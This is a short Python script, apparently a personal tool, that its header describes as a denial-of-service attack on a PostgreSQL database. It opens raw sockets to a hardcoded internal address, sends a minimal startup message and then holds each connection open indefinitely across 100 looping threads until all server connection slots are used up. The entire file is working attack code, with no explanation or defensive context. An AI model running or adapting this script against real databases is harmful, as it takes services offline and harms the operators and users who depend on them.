# dos-postgres.py
# Script dossing a PostgreSQL database by using up all connections
# © Paul Maier 2024

import socket
import struct
import concurrent.futures

host = "10.20.4.80"
port = 5432


def postgres_connect(host, port):
    print(f"Connecting to {host}:{port}")
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((host, port))

                startup_message = b"\x00\x03\x00\x00user\x001\x00database\x001\x00\x00"
                message_length = len(startup_message) + 4
                message_length_bytes = struct.pack("!I", message_length)
                sock.sendall(message_length_bytes + startup_message)

                while True:
                    sock.recv(1)

        except Exception as e:
            print(e)


if __name__ == "__main__":
    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
        futures = [executor.submit(postgres_connect, host, port) for _ in range(100)]

        for future in concurrent.futures.as_completed(futures):
            pass
